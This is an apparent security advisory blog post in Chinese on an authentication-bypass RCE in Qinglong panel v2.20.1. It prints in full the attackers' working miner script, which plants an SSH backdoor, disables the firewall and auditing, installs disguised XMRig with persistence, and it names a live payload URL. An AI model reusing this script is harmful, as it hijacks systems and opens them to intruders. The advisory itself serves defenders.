---
title: 青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
url: https://blog.upx8.com/v2-20-1-RCE
source: 黑海洋Wiki | AI机器人硬件开发 | 网络安全攻防实战 | 区块链技术文档教程 - 免费资源平台
date: 2026-03-01
fetch_date: 2026-03-02T04:06:28.488481
---

# 青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞

# [黑海洋 | Wiki](/ "黑海洋Wiki | AI机器人硬件开发 | 网络安全攻防实战 | 区块链技术文档教程 - 免费资源平台 - 点击返回首页")

# 青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞

发布时间:
2026-03-01 New Article

分类:
[系统安全/Os\_sec](https://blog.upx8.com/os_security)

热度:
3951

在青龙（qinglong）项目中发现了一个**严重的鉴权绕过漏洞**，攻击者可以在**无需任何令牌**的情况下：

1. **绕过所有鉴权检查**
2. **重置管理员密码**
3. **上传任意文件**
4. **执行任意代码（RCE）**
5. **完全控制系统**

![青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://cdn.skyimg.net/up/2026/3/1/ab699dcf.webp)

## 漏洞详情

黑客会上传一个 挖矿脚本  例如：

```
#! /bin/bash
##
VERSION=e4

# Arguments
WALLET=4A8Ye8K9azyVuTvjBCDDZYLmX62A2ivpyQJD97MTsCtCK36Q4QF5xq84ey8DMjxSFc7VUTNh6xx58jPuMP3qp4v2RK42Cb7
PORT=19999

function prune_competition() {
    sudo systemctl stop c3pool_miner.service 2>&1
    sudo systemctl disable c3pool_miner.service 2>&1
    sudo systemctl disable xmrig.service 2>&1
    sudo systemctl stop journalctld.service 2>&1
    sudo systemctl disable journalctld.service 2>&1
    kill -9 $(pidof xmrig) >/dev/null 2>&1
    kill $(ps aux | grep "[--]config=" | awk '{print $2}') 2>&1
    sudo killall xmrig 2>&1
    sudo pkill xmrig 2>&1
    sudo pkill auditd 2>&1
    killall -9 xmrig 2>&1
    killall xmrig 2>&1
    pkill xmrig 2>&1
    pkill auditd 2>&1
    killall auditd 2>&1
    rm -rf rm -rf /root/.local/.c 2>&1
    rm -rf "${HOME}/.c3pool" >/dev/null 2>&1
    rm -rf /root/.c3pool >/dev/null 2>&1
    rm -rf "${HOME}/.local/share/auditd" >/dev/null 2>&1
    rm -rf "${HOME}/.local/.c*" >/dev/null 2>&1
    rm -rf "${HOME}/.local/bin/auditd"
    rm -rf /etc/cron.daily >/dev/null 2>&1
    rm -rf /etc/cron.daily/auditd >/dev/null 2>&1
    rm -rf /etc/systemd/system/journalctld.service 2>&1
    find . -name "*c3pool*" -exec rm -rf {} \; 2>&1
    find . -name "*xmrig*" -exec rm -rf {} \; 2>&1
    find . -name "*miner*" -exec rm -rf {} \; 2>&1
    find $HOME -name "*c3pool*" -exec rm -rf {} \; 2>&1
    find $HOME -name "*xmrig*" -exec rm -rf {} \; 2>&1
    find $HOME -name "*miner*" -exec rm -rf {} \; 2>&1
    find $HOME -name "*c4*" -exec rm -rf {} \; 2>&1
    find $HOME -name "*auditd*" -exec rm -rf {} \; 2>&1

    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDJRrXGodFAgNzqgVw4QmjxKhZbvc6ReMa0ctI8WGbWBi/d' "${HOME}/.ssh/authorized_keys"
    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDJRrXGodFAgNzqgVw4QmjxKhZbvc6ReMa0ctI8WGbWBi/d' "/root/.ssh/authorized_keys"
    sed -i '/c3pool/d;/miner.sh/d' "${HOME}/.profile"
    sed -i '/c3pool/d;/miner.sh/d' "/root/.profile"

    mkdir $HOME/.ssh ; touch $HOME/.ssh/authorized_keys ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/Ciz7soClUOOQPZF9YJVwgnl4oCihc8EaqOWLWxcpOykGXjj0IU1l7I+ikD/sxKHf7sc1IntJa+tye8qjDhkdjMqpIWipcLGwX0Kd6wrdaUIpMO4QoyPAXCXpPjmt8JFRvHFvM9kytksj41ITequa6s1zsDeNpkMz/EqjxrvP2kmQl2b8G5imlvKtlSvJs0UubLw45KD6HH4s/zDokR0Wed3kYBXze/mWuh0kXPLVa9XOhGhBiHWeyJdmYyekTSrLenTcHO1I36F7FfbYtdENxe6o8Nbt3A/oIXF6UruNqyB1DPV1d4MuFGRrj6wPRqOZ2rxynZD2vBghNjwdW2e2ZQbCm0XSlJR43wRGVjqdemTOiars+9UWApREE8RPa90IJkS7jGGG+7xlaYLeJnVgUgMluSfH4DKPVSX6NRmfk8zigdp250XmPqd/9ZU1Ul1JpUZ4WI/DCY4QkTi5FjDjmHIiN3RtOu3kKJ23/uCZwxIFucA6AzXSwxAOJMCua3k=" >> $HOME/.ssh/authorized_keys ; chmod 600 $HOME/.ssh/authorized_keys

    (chmod go-w ~/ && chmod go-w /root && chmod 700 ~/.ssh && chmod 700 /root/.ssh && chmod 600 ~/.ssh/authorized_keys && chown root /root && chown root /root/.ssh) >/dev/null
    sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config >/dev/null
    sudo sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config >/dev/null
    iptables -P INPUT ACCEPT 2>&1
    iptables -P FORWARD ACCEPT 2>&1
    iptables -P OUTPUT ACCEPT 2>&1
    iptables -F 2>&1
    ufw disable 2>&1
}

function install_rig() {
    mkdir -p "${HOME}/.local/.c"
    "${HOME}/.local/.c/journalctld" --help >/dev/null 2>&1
    if test $? -ne 0; then
        # Attempt to download
        LATEST_LINUX_RELEASE=$(curl -s4 https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download | grep linux-static | cut -d'"' -f4)
        if ! curl -s4 -L "${LATEST_LINUX_RELEASE}" -o /tmp/xmrig.tar.gz; then
            exit 1
        fi

        # Attempt to extract
        if ! tar xf /tmp/xmrig.tar.gz -C "${HOME}/.local/.c" --strip=1; then
            exit 1
        fi
        rm /tmp/xmrig.tar.gz
        mv "${HOME}/.local/.c/xmrig" "${HOME}/.local/.c/journalctld"

        # Check if downloaded
        "${HOME}/.local/.c/journalctld" --help >/dev/null
        if test $? -ne 0; then
            exit 1
        fi
    fi

    PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')

    # Config
    CONFIG="${HOME}/.local/.c/config.json"
    sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:33333",/' "${CONFIG}"
    sed -i '/"pass": *"[^"]*",/a \        "tls": true,' "${CONFIG}"
    sed -i 's/"user": *"[^"]*",/"user": "'"${WALLET}"'",/' "${CONFIG}"
    sed -i 's/"pass": *"[^"]*",/"pass": "'"${PASS}"'",/' "${CONFIG}"
    sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "${CONFIG}"
    sed -i 's#"log-file": *null,#"log-file": "'"${HOME}/.local/.c/journalctld.log"'",#' "${CONFIG}"
    sed -i 's/"syslog": *[^,]*,/"syslog": false,/' "${CONFIG}"
    sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' "${CONFIG}"
    sed -i 's/"background": *[^,]*,/"background": false,/' "${CONFIG}"

    # Config (background)
    cp "${CONFIG}" "${HOME}/.local/.c/config_background.json"
    sed -i 's/"background": *false,/"background": true,/' "${HOME}/.local/.c/config_background.json"

    # Prepare start script
    cat >"${HOME}/.local/.c/journalctl" <<EOL
#!/bin/bash

if [ -z "\$(pidof journalctld)" ]; then
    nice ${HOME}/.local/.c/journalctld \$*
fi
EOL
    chmod +x "${HOME}/.local/.c/journalctl"

    # Prepare persistence
    if ! grep journalctl "${HOME}/.profile" >/dev/null; then
        echo "${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config_background.json >/dev/null 2>&1" >> "${HOME}/.profile"
    fi
    if ! grep journalctl "/etc/rc.local" >/dev/null; then
        echo "#!/bin/bash" > "/etc/rc.local"
        echo "${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config_background.json >/dev/null 2>&1" >> "/etc/rc.local" && chmod a+x "/etc/rc.local"
    fi

    if sudo -n true 2>/dev/null; then
        # Attempt to configure huge pages
        if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
            echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
        fi

        if ! type systemctl >/dev/null; then
            /bin/bash "${HOME}/.local/.c/journalctl" --config="${HOME}/.local/.c/config_background.json" >/dev/null 2>&1
        else
            cat >/tmp/journalctld.service <<EOL
[Unit]
Description=systemd journaling
[Service]
ExecStart=${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config.json
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
            sudo mv /tmp/journalctld.service /etc/systemd/system/journalctld.service
            sudo killall journalctld 2>/dev/null
            sudo systemctl daemon-reload
            sudo systemctl enable journalctld.service
            sudo systemctl restart journalctld.service
        fi
    fi

    if [ -z "$(pidof journalctld)" ]; then
        /bin/bash "${HOME}/.local/.c/journalctl" --config="${HOME}/.local/.c/config_background.json" >/dev/null 2>&1
    fi
}

# Run processes
prune_competition
#install_auditd
install_rig

# Version
echo "${VERSION}" > "${HOME}/.local/.c/.version"

sudo /etc/init.d/ssh restart >/dev/null
```

还会定时 执行恶意脚本 `http://118.189.38.103/streams/grep.txt`

特别注意：`grep` 是严重误导性命名！真实载荷极可能是：

* **XMRig 挖矿程序**（伪装成 `grep` 以绕过 `ps aux | grep xmrig` 检测）；
* **AsyncRAT/RemCos 远控木马**（3 中 `duunntrews.duckdns.org` 和 `parosh.didns.ru` 所属家族）；
* **Mirai/XorDDoS 僵尸网络变种**（3 中 `as.ddos678.com`、`bato.cantdown.space` 所属家族）

### 漏洞类型

* **鉴权绕过** (CWE-285)
* **远程代码执行** (CWE-94)
* **权限提升** (CWE-250)

### 风险等级

* **严重程度**: **极高 (Critical)**
* **CVSS评分**: **9.8/10**
* *...